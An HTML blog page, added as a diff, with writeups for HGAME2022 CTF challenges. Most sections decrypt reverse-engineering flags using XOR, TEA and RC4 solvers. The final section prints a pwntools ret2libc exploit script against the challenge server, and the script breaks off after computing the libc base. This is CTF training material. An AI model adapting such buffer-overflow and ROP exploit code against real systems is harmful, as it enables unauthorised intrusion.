@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='主要是 RE，其他的题目会挑着记录一下'><title>HGAME2022 writeups</title>
+
+<link rel='canonical' href='/post/hgame2022-writeups/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HGAME2022 writeups'>
+<meta property='og:description' content='主要是 RE，其他的题目会挑着记录一下'>
+<meta property='og:url' content='/post/hgame2022-writeups/'>
+<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Reverse' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Crypto' /><meta property='article:published_time' content='2022-02-04T13:08:32&#43;08:00'/><meta property='article:modified_time' content='2022-02-04T14:09:16&#43;08:00'/><meta property='og:image' content='/post/hgame2022-writeups/cover.png' />
+<meta name="twitter:title" content="HGAME2022 writeups">
+<meta name="twitter:description" content="主要是 RE，其他的题目会挑着记录一下"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/post/hgame2022-writeups/cover.png' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hgame2022-writeups/">
+                <img src="/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_800x0_resize_box_3.png"
+                        srcset="/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_800x0_resize_box_3.png 800w, /post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="341" 
+                        loading="lazy"
+                        alt="Featured image of post HGAME2022 writeups" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+            <a href="/categories/reverse/" >
+                Reverse
+            </a>
+        
+            <a href="/categories/pwn/" >
+                Pwn
+            </a>
+        
+            <a href="/categories/crypto/" >
+                Crypto
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/hgame2022-writeups/">HGAME2022 writeups</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        主要是 RE，其他的题目会挑着记录一下
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 04, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="week1">Week1</h2>
+<h3 id="reeasyasm">[Re]easyasm</h3>
+<p>题目说 asm，那就硬看汇编呗</p>
+<p>循环右移 4 位，然后异或 0x17</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cipher <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xA0</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x21</span>, 
+    <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xC1</span>, 
+    <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x17</span>
+]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ror</span>(x):
+    <span style="color:#66d9ef">return</span> (x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
+
+<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
+    print (chr(ror(c <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x17</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#75715e"># hgame{welc0me_to_4sm_w0rld}</span>
+</code></pre></div><h3 id="recreakme">[Re]creakme</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// edx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// esi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// edi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// ebx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// esi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// esi
+</span><span style="color:#75715e"></span>  _DWORD v10[<span style="color:#ae81ff">17</span>]; <span style="color:#75715e">// [esp+Ch] [ebp-8Ch] BYREF
+</span><span style="color:#75715e"></span>  _BYTE v11[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+50h] [ebp-48h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> Arglist[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+70h] [ebp-28h] BYREF
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [esp+90h] [ebp-8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v14; <span style="color:#75715e">// [esp+94h] [ebp-4h]
+</span><span style="color:#75715e"></span>
+  memset(Arglist, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(Arglist));
+  sub_40103A(<span style="color:#e6db74">&#34;%s&#34;</span>, (<span style="color:#66d9ef">char</span>)Arglist);
+  strcpy((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v10, <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#34;</span>);
+  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; v14 <span style="color:#f92672">=</span> i )
+  {
+    v5 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i];
+    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>];
+    v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
+    <span style="color:#66d9ef">do</span>
+    {
+      v3 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x12345678</span>;
+      v5 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (v6 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
+      v6 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> (v5 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
+      <span style="color:#f92672">--</span>v7;
+    }
+    <span style="color:#66d9ef">while</span> ( v7 );
+    v8 <span style="color:#f92672">=</span> v14;
+    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v14] <span style="color:#f92672">=</span> v5;
+    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> v6;
+    i <span style="color:#f92672">=</span> v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>;
+  }
+  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)v11 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)dword_402180;
+  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v11[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> dword_402170;
+  <span style="color:#66d9ef">while</span> ( Arglist[v3] <span style="color:#f92672">==</span> v11[v3] )
+  {
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>v3 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> )
+    {
+      sub_40100C(<span style="color:#e6db74">&#34;right!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
+      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+  }
+  sub_40100C(<span style="color:#e6db74">&#34;wrong!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>那一串字符串看似和 Base64 有关，其实加密就是 TEA</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {
+    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x12345678</span>;
+    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span>delta <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>, i;
+    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];
+    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
+        v1 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1);
+        v0 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3);
+        sum <span style="color:#f92672">-=</span> delta;
+    }
+    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1222194312u</span>, <span style="color:#ae81ff">51123276u</span>, <span style="color:#ae81ff">1391163586u</span>, <span style="color:#ae81ff">3986482669u</span>, <span style="color:#ae81ff">2921328102u</span>, <span style="color:#ae81ff">3126465133u</span>, <span style="color:#ae81ff">3482485930u</span>, <span style="color:#ae81ff">1709241059u</span>},k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x44434241</span>,<span style="color:#ae81ff">0x48474645</span>,<span style="color:#ae81ff">0x4c4b4a49</span>,<span style="color:#ae81ff">0x504f4e4d</span>};
+    decrypt(v, k);
+    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
+    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
+    decrypt(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k);
+    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, v);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h3 id="reflag-checker">[Re]Flag Checker</h3>
+<p>jeb 打开</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> com.example.flagchecker<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> android.os.Bundle<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.support.v7.app.AppCompatActivity<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.util.Base64<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.view.View.OnClickListener<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.view.View<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.widget.Button<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.widget.EditText<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> android.widget.Toast<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> javax.crypto.Cipher<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> javax.crypto.spec.SecretKeySpec<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>String arg4<span style="color:#f92672">,</span> String arg5<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+        SecretKeySpec v0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecretKeySpec<span style="color:#f92672">(</span>arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(),</span> 0<span style="color:#f92672">,</span> arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
+        Cipher v5 <span style="color:#f92672">=</span> Cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
+        v5<span style="color:#f92672">.</span><span style="color:#a6e22e">init</span><span style="color:#f92672">(</span>1<span style="color:#f92672">,</span> v0<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">return</span> v5<span style="color:#f92672">.</span><span style="color:#a6e22e">doFinal</span><span style="color:#f92672">(</span>arg4<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">());</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.support.v7.app.AppCompatActivity
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle arg2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>arg2<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">setContentView</span><span style="color:#f92672">(</span>0x7F09001C<span style="color:#f92672">);</span>  <span style="color:#75715e">// layout:activity_main
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">((</span>Button<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070022<span style="color:#f92672">)).</span><span style="color:#a6e22e">setOnClickListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> View<span style="color:#f92672">.</span><span style="color:#a6e22e">OnClickListener</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>  <span style="color:#75715e">// id:button
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.view.View$OnClickListener
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span><span style="color:#f92672">(</span>View arg4<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                String v4 <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>EditText<span style="color:#f92672">)</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070036<span style="color:#f92672">)).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>  <span style="color:#75715e">// id:editTextTextPersonName
+</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> v2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
+                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                    v2 <span style="color:#f92672">=</span> MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>v4<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;carol&#34;</span><span style="color:#f92672">);</span>
+                <span style="color:#f92672">}</span>
+                <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception v4_1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    v4_1<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+                <span style="color:#f92672">}</span>
+
+                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>v2<span style="color:#f92672">,</span> 0<span style="color:#f92672">).</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                    Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Congratulations!!!&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
+                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
+                <span style="color:#f92672">}</span>
+
+                Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Fail,try again.&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">});</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>RC4 + Base64</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+
+cipher <span style="color:#f92672">=</span> b64decode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#39;</span>)
+
+key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;carol&#39;</span>
+rc4 <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(key)
+
+rc4<span style="color:#f92672">.</span>decrypt(cipher)
+<span style="color:#75715e"># b&#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}&#39;</span>
+</code></pre></div><h3 id="re猫头鹰是不是猫">[Re]猫头鹰是不是猫</h3>
+<p>做了两次矩阵乘法，求解方法是先把两个常数矩阵乘起来，然后用 z3 求解</p>
+<h3 id="pwnenter_the_pwn_land">[Pwn]enter_the_pwn_land</h3>
+<p>经典 ret2libc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">34671</span>)
+<span style="color:#75715e"># p = process(b&#39;./a.out&#39;)</span>
+
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401313</span>
+pop_rsi_r15_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401311</span>
+puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
+puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401090</span>
+test_thread <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011B6</span>
+main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401260</span>
+ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+
+pre_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x30</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x2c</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">=</span> pre_payload <span style="color:#f92672">+</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(main)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recvline()
+puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+print (hex(puts_addr))
+
+puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x875A0</span>
+binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1B75AA</span>
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x55410</span>
+
+libc_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> puts_offset
